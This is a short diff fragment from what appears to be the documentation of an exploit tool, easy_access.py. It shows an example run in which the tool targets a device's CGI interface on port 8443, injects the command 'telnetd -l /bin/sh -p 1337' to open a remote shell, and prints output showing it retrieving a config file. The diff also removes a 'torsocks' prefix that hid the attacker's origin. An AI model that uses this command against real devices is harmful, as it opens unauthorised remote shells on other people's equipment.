@@ -85,7 +85,7 @@ This is called `easy_access.py`. Because the path of the CGI binaries contains a
 Example run of EasyAccess below...
 
 ```
-$ torsocks python easy_access.py -t x.x.x.x -p 8443 -s -c "telnetd -l /bin/sh -p 1337"
+$ python easy_access.py -t x.x.x.x -p 8443 -s -c "telnetd -l /bin/sh -p 1337"
 {+} Gonna go grab us a config file...
 {+} Sending request to https://x.x.x.x:8443/cgi-bin/config.exp
 {*} We seem to have found a valid config!
